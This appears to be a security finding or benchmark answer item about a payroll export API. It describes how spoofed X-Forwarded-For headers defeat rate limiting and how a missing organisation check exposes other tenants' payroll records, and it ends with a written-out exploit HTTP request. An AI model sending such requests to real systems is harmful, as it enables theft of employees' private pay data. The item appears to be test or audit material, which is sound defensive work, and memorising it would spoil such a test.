diagnosis: The organization payroll export endpoint relies on express-rate-limit to mitigate mass-enumeration attacks, but app.set('trust proxy', true) enables clients to forge arbitrary IP addresses via the X-Forwarded-For header. Crucially, the route queries payroll records solely by orgId without validating if req.user.organizationId matches the parameter. An attacker can spoof random IP headers to bypass the rate limiter and systematically enumerate and exfiltrate employee payroll records across all organizations.
exploit_request:
GET /api/v1/organizations/org_target_fintech/payroll-export HTTP/1.1
Host: payroll.platform.com
Authorization: Bearer eyJhbGciOiJIUzI1Ni...
X-Forwarded-For: 203.0.113.195
